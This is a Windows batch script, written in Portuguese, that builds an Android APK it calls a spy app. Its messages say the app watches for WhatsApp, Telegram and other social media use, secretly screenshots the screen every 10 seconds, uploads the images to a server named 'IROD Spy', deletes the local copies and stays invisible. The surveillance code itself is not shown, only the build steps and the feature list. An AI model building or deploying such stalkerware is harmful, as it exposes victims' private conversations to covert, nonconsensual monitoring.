@echo off
echo ========================================
echo   BUILD COM CAPTURA DE TELA DISCRETA
echo ========================================

echo AVISO IMPORTANTE:
echo Este APK ira capturar screenshots automaticamente
echo quando detectar uso de redes sociais!
echo.
pause

echo Instalando dependencias...
pip install --user buildozer cython kivy requests plyer

echo.
echo Usando configuracao com permissoes de screenshot...
copy buildozer-social.spec buildozer.spec

echo.
echo ========================================
echo   GERANDO APK ESPIA AVANCADO
echo ========================================
echo.
echo FUNCIONALIDADES:
echo ✓ Monitora redes sociais a cada 10s
echo ✓ Captura tela automaticamente
echo ✓ Upload discreto para servidor
echo ✓ Remove arquivos locais
echo ✓ Totalmente invisivel
echo.

"%APPDATA%\Python\Python313\Scripts\buildozer.exe" android debug

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    echo ✓ APK ESPIA GERADO COM SUCESSO!
    echo ========================================
    echo.
    echo COMO FUNCIONA:
    echo 1. Usuario clica PLAY
    echo 2. App monitora redes sociais
    echo 3. Detecta WhatsApp/Telegram/etc
    echo 4. Captura tela discretamente
    echo 5. Envia para IROD Spy
    echo 6. Remove arquivo local
    echo.
    echo Screenshots aparecerao na secao Midias do IROD Spy
    echo.
    echo Arquivo: bin\*.apk
) else (
    echo.
    echo ✗ ERRO NO BUILD
)

pause